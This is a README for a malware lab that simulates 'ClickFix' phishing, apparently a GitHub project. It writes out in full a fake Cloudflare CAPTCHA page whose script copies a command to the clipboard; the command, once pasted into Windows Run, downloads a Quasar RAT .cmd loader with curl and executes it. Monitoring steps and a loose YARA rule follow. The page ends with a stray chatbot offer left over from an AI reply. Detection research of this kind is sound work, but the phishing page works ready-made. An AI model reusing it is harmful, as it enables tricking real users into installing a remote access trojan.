# ClickFix Social Engineering in Action | Detect Quasar RAT with YARA Forge
This project replicates a real-world malware delivery technique known as ClickFix, where a fake Cloudflare CAPTCHA page tricks users into running a malicious command via Windows Run (Win + R). The payload is a .cmd loader that downloads and executes a Quasar RAT.

---
## Objective
The goal of this simulation is to demonstrate how attackers can abuse social engineering and scripting to deliver a Remote Access Trojan (Quasar RAT) using a fake Cloudflare CAPTCHA page — known as the ClickFix technique.

This project replicates the full infection chain from initial phishing to behavior monitoring and malware detection in a virtual lab setup.

**key Goals:**

  - Simulate a phishing attack using a Cloudflare CAPTCHA-themed page hosted on a Kali Linux server.
  - Trick the victim into pasting a malicious Windows Run command that downloads a .cmd-based Quasar RAT payload.
  - Execute the payload silently on the Windows 10 victim machine.
  - Monitor malware behavior using tools like System Informer, FakeNet-NG, and PE-sieve on the victim system.
  - Create and test a custom YARA rule to statically detect the malicious script or in-memory payload.


## Background Theory
**What is Quasar RAT?**

Quasar RAT is a .NET-based Remote Access Trojan that supports remote desktop, keylogging, system surveillance, and file operations. It is commonly used by threat actors due to its open-source nature and flexibility.

**What is ClickFix?**

"ClickFix" is a deceptive malware delivery method where victims are lured to fake Cloudflare CAPTCHA verification pages. These pages convince the user to run a command in the Windows Run dialog, which triggers the download and execution of malware.


## Lab Setup
Network Settings for All VMs

**Select Adapter 1**:

  - Check Enable Network Adapter
  - Attached to: NAT
  - Adapter Type: Intel PRO/1000 MT Desktop (default is fine)
  - Cable Connected: Checked

**Select Adapter 2**:
  - Adapter 2 – Host-Only Adapter (for Internal/Lab communication)**
 - Go to: VirtualBox → Settings → Network

**Select Adapter 2**:
  - Check Enable Network Adapter
  - Attached to: Host-only Adapter
  - Name: e.g., vboxnet0 (default VirtualBox host-only network)
  - Adapter Type: Intel PRO/1000 MT Desktop
  - Cable Connected:  Checked

Repeat the same for **Windows VM**.

## kali Network Config
![kali 1](https://github.com/user-attachments/assets/9af84ee0-20a4-43cd-80aa-cff6f17e8e5e)
![kali 2](https://github.com/user-attachments/assets/9943cd19-5e9e-41a5-b1e8-c357c1f30c4f)

## Windows 10 Network Config
![win 1](https://github.com/user-attachments/assets/f9596035-b02e-4e1d-8ab7-a5e244cc00b1)
![win 2](https://github.com/user-attachments/assets/7b4ee105-c5f3-4772-b54f-5f05e9905dd2)

**Why this dual adapter setup?**

  - **NAT Adapter** provides internet connectivity (for tool installation, script testing, optional external C2 emulation).
  - **Host-Only Adapter** allows isolated communication between Kali (attacker server) and Windows (victim), simulating a LAN-based or phishing-based attack **without exposing the VM to your real network.**


## Virtual Machines (VirtualBox)
| **VM NAME**  | **Network Adapter** | **Purpose** | **Tools Used** |
|---------------|-------------|---------------|---------------|
| **Kali Linux**    | **Adapter 1: NAT**  | Internet access (for updates, apt, curl)  | Apache2, payload files, phishing page |
|                   | **Adapter 2: Host-Only**  | Private LAN with victim (Windows)  | Hosts phishing page via Apache |
| **Windows 10**    | **Adapter 1: NAT**   | Internet (optional, to simulate a real user) | For browser use and tool installation |
|                   | **Adapter 2: Host-Only** | Access phishing server (Kali VM) | FakeNet-NG, System Informer, YARA |   



## Tool Installation

**Kali Linux:**
```bash
sudo apt update
sudo apt install apache2 curl unzip -y
```

**Windows**
  - System Informer
  - FakeNet-NG
  - YARA (for Windows)
  - YARA Forge

 ## Quasar RAT Sample
   - Malware Hash: bfcdaed93c4c3605be7e800daac4299c4aa0df0218798cb64c2e2f01027989b2
  - Source: MalwareBazaar 
  - File Format: .cmd loader script (ClickFix-style)

## Phase 1: Setup Fake Cloudflare CAPTCHA Page

**1.Start and Enable Apache service:**
```bash
sudo systemctl start apache2
sudo systemctl enable apache2
```

**2. Create the Fake Cloudflare Phishing Directory**
Now, create a folder to host your fake ClickFix page:
```bash
sudo mkdir -p /var/www/html/clickfix
cd /var/www/html/clickfix
```

**3. Create the Fake Cloudflare HTML Page**
Create a file named index.html in that directory:
```bash
sudo nano index.html
```

Paste the following HTML code inside index.html:
```bash
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Just a moment...</title>
  <link rel="icon" href="https://www.cloudflare.com/favicon.ico">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      background-color: #f0f0f0;
      color: #333;
      text-align: center;
      padding-top: 100px;
    }

    .cf-container {
      display: inline-block;
      background: #ffffff;
      padding: 30px 50px;
      border: 1px solid #ddd;
      border-radius: 10px;
      box-shadow: 0 0 15px rgba(0,0,0,0.1);
      max-width: 600px;
    }

    .cf-logo {
      width: 60px;
    }

    .spinner {
      border: 6px solid #f3f3f3;
      border-top: 6px solid #f90;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      margin: 20px auto;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .verify-box {
      background: #fff6e5;
      border-left: 5px solid orange;
      text-align: left;
      padding: 15px;
      margin-top: 20px;
      font-size: 14px;
    }

    textarea {
      width: 100%;
      height: 80px;
      font-size: 13px;
      margin-top: 10px;
      resize: none;
    }

    .btn {
      margin-top: 20px;
      background-color: #f90;
      color: white;
      border: none;
      padding: 10px 24px;
      font-size: 14px;
      border-radius: 4px;
      cursor: pointer;
    }

    .btn:hover {
      background-color: #e68a00;
    }

  </style>
</head>
<body onload="copyPayload()">

  <div class="cf-container">
    <img src="https://www.cloudflare.com/favicon.ico" class="cf-logo" alt="Cloudflare Logo">
    <h2>Just a moment...</h2>
    <div class="spinner"></div>
    <p>pumpfun.exposed is checking your browser before accessing...</p>

    <div class="verify-box">
      <b>To verify you're not a robot, follow these steps:</b>
      <ol>
        <li>Press <b>Windows Key + R</b></li>
        <li>Paste the copied command (<b>Ctrl + V</b>)</li>
        <li>Press <b>Enter</b></li>
      </ol>
      <p><i>"I am not a robot" - reCAPTCHA Verification ID: <b>8731</b></i></p>
      <textarea id="payloadBox" readonly></textarea>
    </div>

    <button class="btn" onclick="alert('Command copied to clipboard! Now press Win + R and Ctrl + V')">VERIFY</button>
  </div>

  <script>
    function copyPayload() {
      const payload = `cmd /c start /min cmd.exe /c "curl -L http://192.168.56.109/clickfix/Quasar.cmd -o %temp%\\verification.txt.bat && call %temp%\\verification.txt.bat"`;
      document.getElementById("payloadBox").value = payload;

      const input = document.createElement("textarea");
      input.value = payload;
      document.body.appendChild(input);
      input.select();
      document.execCommand("copy");
      document.body.removeChild(input);
    }
  </script>

</body>
</html>
```
 - Save and exit the editor: Press Ctrl+O then Enter to save, then Ctrl+X to exit.
![7c4a9590-09d9-41b6-bd2a-4b71ed8ec49c](https://github.com/user-attachments/assets/26c1077b-dc20-4b94-b46b-78ad3ff1c178)



**4. Place the Payload Executable**
You need the fake RAT payload renamed as ClickFix.exe
  - I already have the Quasar RAT as Quasar, move or copy it to /var/www/html/clickfix/:
```bash
sudo cp ~/Downloads/Quasar.cmd /var/www/html/clickfix/
```


**5. Restart Apache to Load Changes**
```bash
sudo systemctl restart apache2
```
**6. Find Kali Linux Host-Only IP**
Run on Kali:
```bash
ip a
```
  - Look for your Host-only adapter (usually eth1 or enp0s8), find the IPv4 address, something like 192.168.56.X.
## Phase 2: Phishing Execution

**Step 2.1: On Windows Victim**
  - Open browser → http://192.168.56.109/clickfix/

  - Copy Run command → press Win + R → paste → Enter

The command silently downloads and executes the Quasar .cmd RAT.

![run in run](https://github.com/user-attachments/assets/bc8bf52f-ad6d-4988-8fa6-3c47b68c9ca2)


## Phase 3: Behavior Monitoring with System Informer

  1. Download System Informer.

  2. Run System Informer as Administrator.

Watch for:

  - New processes or child processes launched by  cmd.exe, powershell.exe,temp.bat
  - Registry changes
  - Network connections
  - Clipboard access

![powershell exe running-PID=6808](https://github.com/user-attachments/assets/d21221c5-6c46-4c8d-b4b5-e3188822d390)
![execution powershell](https://github.com/user-attachments/assets/50f1632b-8ca5-4f84-a3a6-2eadaa3ef6ba)

![ratfile](https://github.com/user-attachments/assets/1ca1d18b-85cb-418c-897c-dc83408188a1)

![txt](https://github.com/user-attachments/assets/4c59e8b0-ce9b-4c83-8430-4608d2fa749c)

![3 Module loaded by powershell](https://github.com/user-attachments/assets/481e5534-7bc6-4851-8b85-2767c9db0c5b)


## Phase 4: Setup FakeNet-NG on Windows VM to Capture C2 Traffic
  
  1. Download and install FakeNet-NG from GitHub.
  2. Run Command Prompt as Administrator.
  - Start → Observe all traffic
  3. Observe FakeNet logs for:

  - Outgoing connections (C2 domains/IPs)
  - HTTP requests & responses
  - Telegram bot API calls

![powershell exe trying to connect this ip ](https://github.com/user-attachments/assets/5426dbdf-3a2f-4acf-b99e-0dff619d5028)

 ## Phase 5: Detect with YARA Forge
 
**How to download YARA for Windows:**

  - Go to: https://github.com/VirusTotal/yara/releases
  - Download yara-<version>-windows.zip
  - Extract the contents

**Use yara64.exe from the extracted folder**

**Step 5.1: Create ClickFix_CMD_Loader.yar for custom YARA Rules**

```bash
rule quasar_rat
{
    meta:
        description = "Detects ClickFix-style CMD loader for Quasar RAT"
        author = "Asaduzzaman Chowdhury Anik"
        date = "2025-06-26"

    strings:
        $s1 = "curl -L"
        $s2 = "cmd /c start"
        $s3 = "%temp%"
        $s4 = ".bat"
        $s5 = ".cmd"
        $s6 = "verification.txt.bat"

    condition:
        any of ($s*)
}

```
**Step 5.2: Scan**

```bash
yara64.exe Clickfix_CMD_loader.yar 6808
```
**NOTE** => [6808 = PID]

![Detect Quasar Rat with YARA Forge](https://github.com/user-attachments/assets/c18f5c54-17d8-4abd-9e39-f4f6a5ae6e38)


## Conclusion
This lab simulates a highly realistic phishing attack leveraging social engineering and .cmd scripting to deliver Quasar RAT. It walks through:

  - Phishing setup using Apache on Kali
  - RAT delivery through Windows Run
  - Live process and traffic monitoring with open tools
  - Memory dumping and YARA rule detection

It reflects a real-world adversary TTP (Tactic, Technique, Procedure) and showcases layered defensive capabilities.


## Important Safety Notes
  - Only run malware on isolated VMs with no network bridge to your real network!
  - Use snapshots to revert VM state if needed.
  - Do not connect victim VM to internet except via NAT adapter for safety.
  - Disable shared folders or clipboard sharing between host and guest while testing.

---

## Credits & Original POC Reference

This project was inspired by a proof-of-concept video by **Ayush Ahmed**:

🎥 **Video Title:**  
[ClickFix Social Engineering in Action - Quasar RAT Detection with YARA Forge](https://www.youtube.com/watch?v=yll8-yqVv0w)

 **Malware Sample Hash:**  
`bfcdaed93c4c3605be7e800daac4299c4aa0df0218798cb64c2e2f01027989b2`  
Available on: [MalwareBazaar](https://bazaar.abuse.ch/sample/bfcdaed93c4c3605be7e800daac4299c4aa0df0218798cb64c2e2f01027989b2/)

> ⚠️ This project is for educational and cybersecurity research purposes only. No part of this work is intended for malicious use or unauthorized access.
Would you like me to insert this directly into your full write-up or GitHub-style README.md version?









